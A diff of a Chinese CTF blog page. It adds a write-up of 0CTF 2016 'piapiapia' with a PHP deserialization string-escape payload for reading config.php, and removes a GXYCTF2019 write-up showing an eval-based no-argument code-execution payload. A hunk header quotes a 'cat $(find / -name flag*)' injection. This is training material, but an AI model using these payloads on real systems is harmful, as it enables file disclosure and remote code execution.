@@ -71,6 +71,75 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-68" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-68/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:39.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-68/">0CTF 2016piapiapia</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一来就试了一下sql注入 无<br>然后<strong>找到一个register.php</strong> 的页面 那边有个上传 也无上传漏洞<br>dirsearch 添加延时参数 <strong>找到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 下载下来得到源码<br>拿到源码 <strong>class.php config.php index.php profile.php register.php update.php</strong><br><strong>config.php 那边有flag 从那边应该可以拿到flag</strong><br>update.php 这边正则匹配了 过滤提交的数据 但是判断nickname那边有长度限制可以用nickname的数组来绕过长度限制就不会die</p>
+<p>png29 这边用到了serialize() 可以试一下反序列化</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/29.PNG?raw=true" alt="29.PNG"></p>
+<p>前面<br>有个update_profile  到class.php 看一下update_profile  的定义方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再往下有个<strong>filter()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>update()</strong> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>update.php 就先正则表达式将提交的参数值过滤 再序列化将非法字符替换成hacker<br>这反序列化还有文件读取       </p>
+<p>  <strong>flag在config中</strong> 这边有序列化 过滤替换 反序列化 文件读取<br>就是反序列化字符逃逸  构造包含config.php的数据利用字符串逃逸 再在profile.php中读取得到<br>反序列化是以”;}结束的 把这个往前放置 就可以将反序列化提前结束的内容就丢弃了<br>突破口：<br> 反序列化字符逃逸，首先序列化的字符是可控的 前面的长度是可控的 但是update.php将参数序列化，可控变量的长度就被写死了<br>要控制得通过序列化后数据过滤替代那边</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>select insert update delete where替换成hacker  写入where替换成hacker 字符串长度+1 因此实际的长的都大于序列化固定长度<br>i:0;s:3:”123”;     -&gt; 就是类似于s:后面这个值           反序列化字符串的逃逸，反序列化只能将nickname的s长度反序列化成功其他的长度已经被写死了， 剩下的字符串 构造class.php因为里面包含了flag 并将其位置放到photo上然后将photo扔掉<br>这样profile.php 中读取的photo就是我么构造的config.php 就能拿到flag了<br>假设：</p>
+<?php
+//$a = array('123', 'abc', 'defg');
+//var_dump(serialize($a));
+//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
+$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
+$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
+var_dump(unserialize($b));
+var_dump(unserialize($b));
+?><p>构造这样一个 defg会被丢弃qwert占了原本的位置<br>目的是将”;}s:5:photo;s:10:”config.php”;}  这串总共34位  插入到序列化的字符串中<br>hacker比where多一个字符那就得需要挤出34位 也就是34个where 上传后再去profile查看内容</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/30.PNG?raw=true" alt="30.PNG"></p>
+<p>payload ：wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:photo;s:10:”config.php”;}</p>
+<p>profile.php 那边查看源码 base64解码一下就可以了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/31.PNG?raw=true" alt="31.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/32.PNG?raw=true" alt="32.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-68/" data-id="ckroqtfm5001cyww70axr0e8p" data-title="0CTF 2016piapiapia" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-67" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/13/page-67/" class="article-date">
@@ -686,78 +755,6 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
 
 
   
-    <article id="post-page-57" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-57/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:44:23.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-57/">GXYCTF2019禁止套娃源码</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>这题有个git泄露   url后头加个.git 然后丢到githacker 下载下来源代码</strong></p>
-<?php
-include "flag.php";
-echo "flag在哪里呢？<br>";
-if(isset($_GET['exp'])){       ；典型的木马get方式  
-    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {    ；这边常用伪协议均被禁止了就很离谱 
-        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {        ；这边正则匹配 ？R表示引用当前表达式  [a-z,_]+[a-z,_]+\((?R)?\)  合法表达式类似于a(b();) 
-            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {   ；过滤一些字眼
-                // echo $_GET['exp'];
-                @e、、v、、a、、l($_GET['exp']);
-            }
-            else{
-                die("还差一点哦！");
-            }
-        }
-        else{
-            die("再好好想想！");
-        }
-    }
-    else{
-        die("还想读flag，臭弟弟！");
-    }
-}
-// highlight_file(__FILE__);
-?>
-
-<p>然其不能使用php伪协议，<strong>但是@e、、v、、a、、l($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录</strong>  ╮(╯▽╰)╭这顿号加的很无奈 不然到时候又被杀了</p>
-<ul>
-<li><strong>scandir</strong>  (语法scandir（dictionary，sorting_order,context);)    使用至少必需要有一个directory的，但是我们又没有办<strong>法去定义一个变量，这时候就要考虑php有没有什么函数是自带常量的</strong>：localeconv()  (这玩意是个数组 然后就得用到current()  这函数就自带常量  current语法current(array)</li>
-</ul>
-<p>构造一下就是array(localeconv)   </p>
-<p>在构造一下就是?exp=print_r(scandir(current(localeconv())));      然后目录爆出来</p>
-<p>这波还需要用到<strong>next函数将内部指针指向数组的下一个元素并输出.</strong></p>
-<p><strong>正常next</strong>需要用到挺多次的 然而scandir函数的返回值是一个数组，如果把<strong>数组逆序排列</strong>，再用一个<strong>next</strong>即可达成目的<br>然后就是<strong>用到array_reverse</strong>这个神奇的函数：以相反的元素按顺序返回数组<br>然后最后<strong>highlight_file 输出文件即可</strong><br>payload：?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-57/" data-id="ckroqtfm10013yww77g68dhn6" data-title="GXYCTF2019禁止套娃源码" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -794,6 +791,10 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -807,10 +808,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
         
           <li>
             <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
           </li>
         
       </ul>
